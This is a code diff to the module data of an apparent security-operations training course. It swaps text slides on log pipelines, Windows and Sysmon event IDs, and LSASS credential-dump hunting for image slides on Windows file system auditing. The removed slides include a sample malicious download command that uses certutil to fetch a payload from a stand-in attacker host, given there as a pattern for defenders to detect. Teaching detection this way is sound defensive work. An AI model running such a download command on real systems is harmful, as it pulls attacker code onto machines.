@@ -257,80 +257,33 @@ export const SOC_MODULES = [
     progress: 100,
     difficulty: "Intermediate",
     duration: "55 Mins",
-    slideCount: 20,
+    slideCount: 11,
     labCount: "4 Labs Completed (4/4)",
-    tags: ["Log Pipeline", "Sysmon Telemetry", "Windows Events"],
-    skills: ["Windows Event Logs", "Sysmon Telemetry", "Linux Auditd", "Log Normalization", "SIEM Ingestion"],
-    summary: "Master centralized log collection, parsing, Syslog, Windows Security Events, Sysmon endpoint telemetry, and log retention architectures.",
+    tags: ["Log Pipeline", "System Auditing", "Windows Events"],
+    skills: ["Windows Event Logs", "System Auditing", "Sysmon Telemetry", "Linux Auditd", "SIEM Ingestion"],
+    summary: "Master centralized log collection, Windows file system auditing, Event ID 4663 verification, Syslog, and endpoint telemetry pipelines.",
 
-    slides: [
+    slideSections: [
       {
-        id: 1,
-        title: "The Log Ingestion Architecture",
-        subtitle: "Collection, Parsing, Normalization, and Storage",
-        bullets: [
-          "Without complete, tamper-proof logs, incident reconstruction and root cause forensics are impossible.",
-          "Log Sources: Endpoints (Sysmon, Windows Event Log), Network Devices (Firewalls, Switches, NetFlow), Cloud Services (IAM, Audit trails).",
-          "Log Pipeline: Collection Agent ➔ Universal Forwarder ➔ Ingestion & Parsing (CIM Normalization) ➔ Indexing ➔ Storage & Retention."
-        ],
-        diagram: `
- [ Endpoints ]     [ Firewalls ]     [ Active Directory ]
-       │                 │                    │
-       ▼                 ▼                    ▼
- [ Universal / Heavy Forwarders & Rsyslog Relays ]
-                         │
-                         ▼
-           [ SIEM Normalization (CIM) ]
-                         │
-                         ▼
-         [ Indexed Hot / Warm / Cold Tiers ]`
-      },
-      {
-        id: 2,
-        title: "The Essential Windows & Sysmon Event IDs",
-        subtitle: "The Core Telemetry Registry for Threat Hunting",
-        bullets: [
-          "Security.evtx ID 4624: Successful Logon (LogonType 2 Interactive, LogonType 3 Network, LogonType 10 RDP).",
-          "Security.evtx ID 4625: Failed Logon (Crucial for brute force and password spray detection).",
-          "Sysmon Event ID 1: Process Creation with full command-line arguments and parent process tree.",
-          "Sysmon Event ID 10: ProcessAccess (Monitoring LSASS handle acquisition for credential dumping)."
-        ],
-        diagram: `
- ┌────────────────────────────────────────────────────────┐
- │           ESSENTIAL EVENT IDs FOR SOC LOGS             │
- ├──────────┬───────────────────────┬─────────────────────┤
- │ Event ID │ Source                │ Security Value      │
- ├──────────┼───────────────────────┼─────────────────────┤
- │ 4624     │ Security.evtx         │ Successful Auth     │
- │ 4625     │ Security.evtx         │ Failed Auth / Spray │
- │ Sysmon 1 │ Sysmon/Operational   │ Process Execution   │
- │ Sysmon 3 │ Sysmon/Operational   │ Network Sockets     │
- │ Sysmon 10│ Sysmon/Operational   │ LSASS Access / Dump │
- └──────────┴───────────────────────┴─────────────────────┘`
-      },
-      {
-        id: 3,
-        title: "Parent-Child Process Anomalies in Logs",
-        subtitle: "Spotting Malicious Spawning in Process Trees",
-        bullets: [
-          "Normal: `winword.exe` should NOT spawn `powershell.exe`, `cmd.exe`, or `cscript.exe`.",
-          "Normal: Web servers like `w3wp.exe` (IIS) or `httpd.exe` should NEVER spawn command shells (`cmd.exe /c whoami`).",
-          "Suspicious LOLBAS: `certutil.exe -urlcache -f http://evil.com/payload.exe` (Abusing certificate utility for download).",
-          "Hunting query: Filter for `ParentImage: *\\winword.exe` AND `Image: *\\cmd.exe`."
-        ]
-      },
-      {
-        id: 4,
-        title: "Hunting Credential Dumping (LSASS)",
-        subtitle: "Detecting Mimikatz and Memory Handle Acquisition",
-        bullets: [
-          "Local Security Authority Subsystem Service (`lsass.exe`) stores password hashes, Kerberos tickets, and cleartext credentials in memory.",
-          "Mimikatz invokes `MiniDumpWriteDump` targeting LSASS with `PROCESS_ALL_ACCESS` or `PROCESS_VM_READ`.",
-          "Sysmon Event ID 10 monitors `TargetImage: C:\\Windows\\system32\\lsass.exe`.",
-          "Any non-standard process requesting handle permissions (`GrantedAccess: 0x1010` or `0x1FFFFF`) to LSASS triggers an immediate Critical Alert."
+        id: "system-auditing",
+        title: "System Auditing",
+        slides: [
+          { id: 11, title: "Enable File System Auditing (secpol.msc)", image: "/soc-slides/module-03/system-auditing/11.png" },
+          { id: 12, title: "Advanced Audit Policy Configuration", image: "/soc-slides/module-03/system-auditing/12.png" },
+          { id: 13, title: "Object Access — Audit File System", image: "/soc-slides/module-03/system-auditing/13.png" },
+          { id: 14, title: "Enable Success & Failure Auditing (auditpol)", image: "/soc-slides/module-03/system-auditing/14.png" },
+          { id: 15, title: "Create File & Rule Target (cysa.conf)", image: "/soc-slides/module-03/system-auditing/15.png" },
+          { id: 16, title: "Security Properties → Advanced Auditing", image: "/soc-slides/module-03/system-auditing/16.png" },
+          { id: 17, title: "Select Auditing Principal", image: "/soc-slides/module-03/system-auditing/17.png" },
+          { id: 18, title: "Configure Basic Auditing Permissions", image: "/soc-slides/module-03/system-auditing/18.png" },
+          { id: 19, title: "Configure Advanced Auditing Permissions", image: "/soc-slides/module-03/system-auditing/19.png" },
+          { id: 20, title: "Edit the Monitored File (cysa.conf)", image: "/soc-slides/module-03/system-auditing/20.png" },
+          { id: 21, title: "Event Viewer Security Log (Event ID 4663)", image: "/soc-slides/module-03/system-auditing/21.png" }
         ]
       }
     ],
+
+    slides: [],
 
     theory: {
       overview: "Effective log management transforms massive streams of disparate system events into structured, searchable intelligence.",
